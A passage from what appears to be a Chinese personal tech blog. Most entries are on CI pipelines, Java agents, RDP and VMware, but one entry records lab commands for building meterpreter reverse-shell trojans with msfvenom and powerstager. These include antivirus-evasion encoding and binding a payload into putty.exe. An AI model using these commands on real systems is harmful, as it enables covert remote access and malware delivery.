class="attr">before_script:</span></span><br><span class="line">  <span class="comment"># dollar 符号开头的是系统环境变量</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">$docker_password</span> <span class="string">|</span> <span class="string">docker</span> <span class="string">login</span> <span class="string">-u</span> <span class="string">$docker_username</span> <span class="string">--password-stdin</span> <span class="string">$docker_addr</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">  <span class="comment"># docker build -t image:tag Dockerfile所在位置（构建docker镜像）</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">$docker_addr/$REPO:latest</span> <span class="string">.</span></span><br><span class="line">  <span class="comment"># 将docker push到harbor对应仓库</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">push</span> <span class="string">$docker_addr/$REPO:latest</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">dev</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>main.go</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>run.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p><code>Dockerfile</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> build/helloworld /main</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> run.sh /run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN  apk add --no-cache bash</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  chmod +x /main \</span></span><br><span class="line"><span class="bash">    &amp;&amp; chmod +x /run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>





<h2 id="流水线2-拉docker私有仓库已经存在的镜像，运行"><a href="#流水线2-拉docker私有仓库已经存在的镜像，运行" class="headerlink" title="流水线2:拉docker私有仓库已经存在的镜像，运行"></a>流水线2:拉docker私有仓库已经存在的镜像，运行</h2><p>其实上一个已经包含了这个，build go的那个就是，只是需要指定一下环境变量然后来访问私库，在before_script中指定一下就好</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>CI/CD</tag>
      </tags>
  </entry>
  <entry>
    <title>java插桩(javaagent)</title>
    <url>/2021/11/25/java%E6%8F%92%E6%A1%A9-javaagent/</url>
    <content><![CDATA[<p>昨天整了半天没有整出来的那个结果最后是一个包名引用错了..</p>
<p>在MANIFEST.MF中使用的包名和我自己的包名没有对上…</p>
<p>首先搬运<a href="http://rui0.cn/archives/1063">这个师傅</a>关于java Instrument的原理</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637811098130-2021-11-2511:31:38.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637811051074-2021-11-2511:30:51.png"></p>
<h2 id="javaagent"><a href="#javaagent" class="headerlink" title="javaagent"></a>javaagent</h2><p>在maven项目里面修改pom.xml文件然后添加入build的选项</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Project-name</span>&gt;</span>javaagent<span class="tag">&lt;/<span class="name">Project-name</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Project-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">Project-version</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>com.javaagent.MyAgent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">skip</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skip</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加入packing和build标签，</p>
<p>首先做一个MyAgent类，导入了<code>java.lang.instrument.Instrumentation</code>的接口</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637809667716-2021-11-2511:07:47.png"></p>
<p>这是一个Java1.6加进来的接口，作用就是你通过jvmti代理引用程序来jvm的访问（主要用于类的动态改变和操作），这里只是将其用于一个在main函数执行之前的劫持并加载我们自己的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src/main/java/com/javaagent/MyAgent.java</span></span><br><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello javaagent permain:&quot;</span>+args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面这个premain方法就是Instrmentation中提供的一个方法，可以在main运行前先运行premain函数里面的内容。</p>
<p>接下来定义新一个新的类用来执行main函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//src/test/java/MyAgentTest.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgentTest</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编辑一下MANIFEST.MF文件</p>
<p><strong>在这个函数中需要定义好一个Premain-Class选项，这个用于定位刚刚写的MyAgent那个包含了Premain函数的类（就是包中类的位置），配置项填错就没法运行。</strong></p>
<p>然后使用maven build这个package</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637809392632-2021-11-2511:03:12.png"></p>
<p>最后配置vm options来添加一个javaagent在启动时添加参数</p>
<p><code>-javaagent:这里是之前package打包出来的jar包路径.jar=1</code></p>
<p>后面的参数1是premain函数接收的参数args。</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637810470431-2021-11-2511:21:10.png"></p>
<p>最后运行这个MyAgentTest.java</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637810617995-2021-11-2511:23:38.png"></p>
<h2 id="使用ByteBuddy构建一个java-Agent"><a href="#使用ByteBuddy构建一个java-Agent" class="headerlink" title="使用ByteBuddy构建一个java Agent"></a>使用ByteBuddy构建一个java Agent</h2><p>只需要加依赖然后修改一下就好,添加两个依赖,和<a href="https://lycshub.github.io/2021/11/24/java-ByteBuddy/">之前文章</a>一样先导入ByteBuddy</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/net.bytebuddy/byte-buddy-agent --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy-agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="重写premain方法"><a href="#重写premain方法" class="headerlink" title="重写premain方法"></a>重写<code>premain</code>方法</h3><p>官方教程给的使用ByteBuddy创建一个java Agent的方法</p>
<h4 id="创建-Java-Agents"><a href="#创建-Java-Agents" class="headerlink" title="创建 Java Agents"></a>创建 Java Agents</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ToStringAgent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String arguments, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> AgentBuilder.Default()</span><br><span class="line">        .type(isAnnotatedWith(ToString.class))</span><br><span class="line">        .transform(<span class="keyword">new</span> AgentBuilder.Transformer() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> DynamicType.<span class="function">Builder <span class="title">transform</span><span class="params">(DynamicType.Builder builder,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              TypeDescription typeDescription,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              ClassLoader classloader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> builder.method(named(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">                      .intercept(FixedValue.value(<span class="string">&quot;transformed&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).installOn(instrumentation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后根据这个形式去写</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.agent.builder.AgentBuilder;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.method.MethodDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.type.TypeDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.dynamic.DynamicType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.MethodDelegation;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.matcher.ElementMatchers;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.utility.JavaModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;Hello javaagent permain:&quot;+args);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;this is an perform monitor agent.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Transformer transformer = <span class="keyword">new</span> AgentBuilder.Transformer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> DynamicType.Builder&lt;?&gt; transform(DynamicType.Builder&lt;?&gt; builder, TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> builder</span><br><span class="line">                    .method(ElementMatchers.&lt;MethodDescription&gt;any()) <span class="comment">// 拦截任意方法</span></span><br><span class="line">                    .intercept(MethodDelegation.to(TimeInterceptor.class)); <span class="comment">// 委托</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Listener listener = <span class="keyword">new</span> AgentBuilder.Listener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDiscovery</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTransformation</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded, DynamicType dynamicType)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onIgnored</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded, Throwable throwable)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> AgentBuilder</span><br><span class="line">                .Default()</span><br><span class="line">                .type(ElementMatchers.nameStartsWith(<span class="string">&quot;com.javaagent.MyAgentTest&quot;</span>)) <span class="comment">// 指定需要拦截的类</span></span><br><span class="line">                .transform(transformer)</span><br><span class="line">                .with(listener)</span><br><span class="line">                .installOn(instrumentation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="实现委托"><a href="#实现委托" class="headerlink" title="实现委托"></a>实现委托</h3>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.Origin;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.RuntimeType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.SuperCall;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RuntimeType</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">intercept</span><span class="params">(<span class="meta">@Origin</span> Method method,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="meta">@SuperCall</span> Callable&lt;?&gt; callable)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 原有函数执行</span></span><br><span class="line">            <span class="keyword">return</span> callable.call();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(method + <span class="string">&quot;: took &quot;</span> + (System.currentTimeMillis() - start) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="MyAgentTest进行调用"><a href="#MyAgentTest进行调用" class="headerlink" title="MyAgentTest进行调用"></a><code>MyAgentTest</code>进行调用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgentTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;main&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;this is fun 1.&quot;</span>);</span><br><span class="line">    Thread.sleep(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is fun 2.&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -javaagent:这里依旧是包的路径/javaagent-1.0-SNAPSHOT.jar</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyAgentTest test = <span class="keyword">new</span> MyAgentTest();</span><br><span class="line">        test.fun1();</span><br><span class="line">        test.fun2();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​        同样先build然后在进行运行</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637819013265-2021-11-2513:43:33.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.jinyunlong.xyz/articles/2021/05/15/1621089190040.html">http://www.jinyunlong.xyz/articles/2021/05/15/1621089190040.html</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12709402.html">https://www.cnblogs.com/tr1ple/p/12709402.html</a></p>
<p><a href="https://github.com/hawkingfoo/demo-agent">https://github.com/hawkingfoo/demo-agent</a></p>
<p><a href="http://rui0.cn/archives/1063">http://rui0.cn/archives/1063</a></p>
<p><a href="http://www.noobyard.com/article/p-smvzgpzs-dh.html">http://www.noobyard.com/article/p-smvzgpzs-dh.html</a></p>
]]></content>
      <categories>
        <category>插桩</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>linux使用rdp远程连接windows</title>
    <url>/2021/12/18/linux%E4%BD%BF%E7%94%A8rdp%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5windows/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用过<code>ubuntu</code>自带的一个远程软件，还是图形化的，也支持rdp协议　叫<code>remmina</code>，那体验真的拉胯，只能显示一1/4屏幕…</p>
<span id="more"></span>

<h2 id="windows家庭版开启远程桌面"><a href="#windows家庭版开启远程桌面" class="headerlink" title="windows家庭版开启远程桌面"></a>windows家庭版开启远程桌面</h2><p>众所周知，windows家庭版并不好用，特别是当涉及到一些高级的系统配置的时候比如组策略没有还要自己开，而这个远程桌面也一样，我去年在别的机子上折腾过一遍，是真的折腾</p>
<p>之前没，现在记录一下</p>
<p>用的是这个项目</p>
<p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p>
<p>下载无脑解压，点击安装脚本，装完之后，因为系统版本都很高大概率是不行的，显示的是未支持</p>
<p>这个时候需要替换文件两个为你自己的windows版本，为这个工具做适配</p>
<p><code>winver</code>查看windows的版本，然后去网上搜对应的文件一般是　termsrv.dll（这次没替换这个就能用了，替换这个有系统崩溃风险）和rdpwrap.ini，rdpwrap.dll文件</p>
<h3 id="替换文件"><a href="#替换文件" class="headerlink" title="替换文件"></a>替换文件</h3><p>安装完之后会需要修改两个文件，在<code>C:\Program Files\RDP Wrapper</code>这个路径下，然后根据自己的系统版本来替换</p>
<p><a href="https://github.com/stascorp/rdpwrap/issues/1630">https://github.com/stascorp/rdpwrap/issues/1630</a></p>
<p><a href="https://github.com/affinityv/INI-RDPWRAP">https://github.com/affinityv/INI-RDPWRAP</a></p>
<p>总结一下其实就只要install脚本安装之后直接替换对应系统版本的rdpwrap.ini和dll文件就行，如果还不行就试试替换termscrv.dll</p>
<p>最终目的就是达到那个全绿</p>
<h3 id="还不行？"><a href="#还不行？" class="headerlink" title="还不行？"></a>还不行？</h3><p>如果全绿了还不行，考虑以下几个问题</p>
<ol>
<li><p>windows防火墙是否放行了3389</p>
</li>
<li><p>windows是否有本地用户</p>
</li>
</ol>
<h2 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h2><p>这次因为远程工作需求，又需要用到自带的rdp，找了找工具，发现了这个<code>rdesktop</code></p>
<p>命令行工具，还挺好用</p>
<p><code>rdesktop -a 16 -u [username] -p [password]　[your_remotehost]</code></p>
<ul>
<li>这个参数可以共享剪切板</li>
</ul>
<p><code>-r clipboard:PRIMARYCLIPBOARD</code></p>
<ul>
<li>这个参数可以共享文件目录给远程主机</li>
</ul>
<p><code> -r disk:test=/tmp</code></p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>msf木马</title>
    <url>/2021/11/19/msf%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<p>尝试一下传木马到目标机然后用msf监听</p>
<h3 id="powerstger"><a href="#powerstger" class="headerlink" title="powerstger"></a>powerstger</h3><p><code>python powerstager.py -m -t win64 --lhost=192.168.100.103 --lport=4444 -o /tmp/payload.exe</code></p>
<p>直接使用这个生成一个木马然后使用msfconsole监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 192.168.100.103</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>设置了一下必要的参数,</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637300782157-2021-11-1913:46:22.png"></p>
<p>把刚刚与哦那个payload生成的丢虚拟机执行,然后拿到shell</p>
<p><img src="/home/harry/.config/Typora/typora-user-images/image-20211119135213459.png" alt="image-20211119135213459"></p>
<p>然而没有绕过火绒，直接被拦截了，关了火绒再打得:small_airplane:</p>
<p>还试了一下<a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p>这个也是直接就被拦截了</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637302026758-2021-11-1914:07:06.png"></p>
<h3 id="msf自带"><a href="#msf自带" class="headerlink" title="msf自带"></a>msf自带</h3><p><a href="https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA">https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA</a></p>
<p>19年的免杀测试，这里记录下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#可以查看所有的编码器</span><br><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure>



<ul>
<li>原始免杀</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe -o payload1.exe</code></p>
<ul>
<li>msf自编码</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15  -f exe -o payload2.exe</code></p>
<ul>
<li>msf自捆绑免杀</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333  -x putty.exe  -f exe -o payload3.exe</code></p>
<ul>
<li>msf自捆绑+免杀</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o payload4.exe</code></p>
<ul>
<li>msf自捆绑多次编码免杀</li>
</ul>
<p><code>msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</code></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>这个免杀专题用来参考挺好</p>
<p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>
<p>挖个坑，shelllcodeLoader免杀<a href="https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md">https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>popOS_vmware无法启动问题</title>
    <url>/2022/06/04/popOS-vmware%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>打开vmware</p>
<p>发现启动不了…</p>
<p>写这是updater 淦，怕不是vmware自动升级导致他没法启动了</p>
<p>报错<code>[Before you can run VMware several modules must be compiled]</code></p>
<p>点击install之后继续报错</p>
<span id="more"></span>

<p>重启大法 ，无效 ， 好吧</p>
